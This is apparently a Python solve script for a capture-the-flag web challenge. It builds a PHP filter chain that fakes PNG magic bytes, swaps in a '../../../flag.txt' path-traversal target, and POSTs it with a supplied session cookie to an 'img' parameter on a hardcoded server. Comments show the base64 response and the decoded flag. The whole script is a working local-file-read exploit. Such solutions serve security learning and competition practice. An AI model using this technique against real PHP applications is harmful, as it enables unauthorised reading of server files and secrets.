import base64
import requests
import php_filter_chain_generator.php_filter_chain_generator as chain

prepend = chain.generate_filter_chain(
    base64.b64encode(
        b"\x89\x50\x4e\x47" + b" " * 2
    )  # need to pad with spaces so that the base64 string has no =
    .decode("utf-8")
    .replace("=", "")
).replace(
    # "php://temp", f"data://text/plain;base64,{base64.b64encode(b'testtesttest').decode("utf-8")}"
    "php://temp",
    "../../../flag.txt",
)
print(prepend)
session = input("PHP session: ")  # 2ab7a54a6d039699498291e26a3627f6

with requests.post(
    "http://20.55.48.101/user_photo.php",
    cookies={
        "PHPSESSID": session,
    },
    data={
        "img": prepend,
    },
) as req:
    print(
        req.content
    )  # b'Still Under Development<Br><img src=data:base64,iVBORyAgGyQpQzB4TDR1Z2h7QWhoaGhoX0hvcDNfVV9EaWRfIXRfYnlfVGgzX0ludGVuZGVkX1dAQHl9Cg+AD0APQ+AD0APQ+AD0APQ+AD0APQ+AD0APQ+AD0APQ+AD0APQ+AD0APQ+AD0AP'
    print(
        base64.b64decode(req.content.split(b",", 1)[1])
    )  # b'\x89PNG  \x1b$)C0xL4ugh{Ahhhhh_Hop3_U_Did_!t_by_Th3_Intended_W@@y}\n\x0f\x80\x0f@\x0fC\xe0\x03\xd0\x03\xd0\xf8\x00\xf4\x00\xf4>\x00=\x00=\x0f\x80\x0f@\x0fC\xe0\x03\xd0\x03\xd0\xf8\x00\xf4\x00\xf4>\x00=\x00=\x0f\x80\x0f@\x0f'
